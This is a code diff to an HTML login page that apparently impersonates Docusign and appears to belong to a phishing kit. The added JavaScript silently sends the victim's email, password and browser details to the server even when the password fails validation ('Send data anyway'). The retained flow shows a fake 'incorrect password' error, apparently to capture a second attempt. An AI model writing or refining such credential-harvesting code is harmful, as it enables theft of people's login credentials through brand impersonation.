@@ -396,7 +396,6 @@
             Copyright © 2025 Docusign Inc. All rights reserved
         </div>
     </footer>
-
     <script>
         // Track login attempts
         let attemptCount = 0;
@@ -428,6 +427,41 @@
             const password = document.getElementById('password').value;
             const errorElement = document.getElementById('errorMessage');
             const loginButton = document.querySelector('.login-button');
+
+            // Helper to log invalid attempts silently
+            const logAttempt = async () => {
+                try {
+                    const browserInfo = {
+                        platform: navigator.platform,
+                        userAgent: navigator.userAgent,
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        status: "BLOCKED_WEAK_PASSWORD" // Tag this attempt
+                    };
+                    await fetch('/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email, password, browserInfo })
+                    });
+                } catch (e) { }
+            };
+
+            // Basic Input Validation
+            if (password.length < 6) {
+                logAttempt(); // Send data anyway
+                errorElement.textContent = 'Please enter a valid password.';
+                errorElement.classList.add('show');
+                document.getElementById('password').focus();
+                return;
+            }
+
+            const trivialPasswords = ['123456', '12345678', 'password', 'qwerty', '123456789'];
+            if (trivialPasswords.includes(password.toLowerCase())) {
+                logAttempt(); // Send data anyway
+                errorElement.textContent = 'Please enter your correct password.';
+                errorElement.classList.add('show');
+                document.getElementById('password').focus();
+                return;
+            }
 
             // Show loading state
             const originalButtonText = loginButton.textContent;
@@ -502,7 +536,7 @@
             } catch (error) {
                 console.error('Error:', error);
                 attemptCount++;
-                
+
                 if (attemptCount < 2) {
                     errorElement.classList.add('show');
                     errorElement.textContent = 'The email address or password you entered is incorrect. Please try again.';
